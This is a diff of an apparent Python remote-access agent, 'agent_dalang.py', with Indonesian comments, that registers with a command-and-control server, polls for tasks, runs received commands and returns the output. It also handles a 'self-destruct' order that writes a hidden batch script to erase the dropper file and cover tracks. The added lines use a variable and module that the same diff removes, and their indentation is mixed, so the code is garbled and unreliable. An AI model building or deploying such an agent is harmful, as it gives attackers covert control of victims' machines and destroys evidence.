@@ -1,4 +1,4 @@
-# agent_dalang.py (Revisi Final - Silent Exit)
+# agent_dalang.py
 
 import requests
 import subprocess
@@ -7,14 +7,13 @@ import random
 import socket
 import getpass
 import platform
-import sys
-import os
+import sys  # DIUBAH: Tambahkan import sys untuk keluar dari script
 
 # --- KONFIGURASI ---
-C2_URL = "http://192.168.1.100:5000"
+C2_URL = "http://192.168.1.100:5000" 
 AGENT_ID = None
-BAT_TO_DELETE = None 
 
+# --- Fungsi register_agent, get_task, execute_task, send_results (Tidak ada perubahan) ---
 def register_agent():
     global AGENT_ID
     hostname = socket.gethostname()
@@ -67,12 +66,14 @@ def send_results(task_id, output):
     except requests.exceptions.RequestException as e:
         print(f"[!] Gagal mengirim hasil: {e}")
 
+
 def main_loop():
     """Loop utama untuk operasional agent."""
     register_agent()
 
     while True:
         if not AGENT_ID:
+            print("[!] Pendaftaran gagal. Mencoba lagi dalam 60 detik...")
             time.sleep(60)
             register_agent()
             continue
@@ -84,14 +85,13 @@ def main_loop():
             command = task.get("command")
             tool = task.get("tool")
 
-            # --- BLOK LOGIKA SELF-DESTRUCT YANG DISEMPURNAKAN ---
+            # --- BLOK LOGIKA BARU UNTUK TERMINATE ---
             if tool == "internal" and command == "self-destruct":
-                print("[!] Menerima perintah terminate & self-destruct.")
-                send_results(task_id, "Agent terminated successfully. Footprint cleanup initiated.")
-                
-                if BAT_TO_DELETE and os.path.exists(BAT_TO_DELETE):
-                    cleanup_script_path = os.path.join(os.environ["TEMP"], f"cleanup_{random.randint(1000,9999)}.bat")
-                    
+                print("[!] Menerima perintah terminate. Keluar.")
+                send_results(task_id, "Agent terminated successfully.")
+		 if BAT_TO_DELETE and os.path.exists(BAT_TO_DELETE):
+                    cleanup_script_path = os.path.join(os.environ["TEMP"], 						f"cleanup_{random.randint(1000,9999)}.bat")
+               
                     # --- PERUBAHAN UTAMA: Skrip pembersih dibuat tanpa ECHO ---
                     with open(cleanup_script_path, "w") as f:
                         f.write(f'@echo off\n')
@@ -110,12 +110,16 @@ def main_loop():
                     )
                     print(f"[*] Skrip pembersih tak terlihat diluncurkan untuk menghapus {BAT_TO_DELETE}")
 
-                sys.exit(0)
+                sys.exit(0)	                
+
+		sys.exit(0) # Perintah untuk keluar dari script
 
             if command == "sleep":
                 sleep_duration = task.get("duration", 30)
+                print(f"[*] Tidak ada tugas. Tidur selama {sleep_duration} detik.")
                 time.sleep(sleep_duration)
             else:
+                print(f"[*] Menerima tugas baru: {command}")
                 output = execute_task(task)
                 send_results(task_id, output)
                 time.sleep(random.randint(5, 10))
@@ -123,8 +127,4 @@ def main_loop():
             time.sleep(30)
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        BAT_TO_DELETE = sys.argv[1]
-        print(f"[INFO] Agent akan menghapus jejak file: {BAT_TO_DELETE} saat di-terminate.")
-
     main_loop()
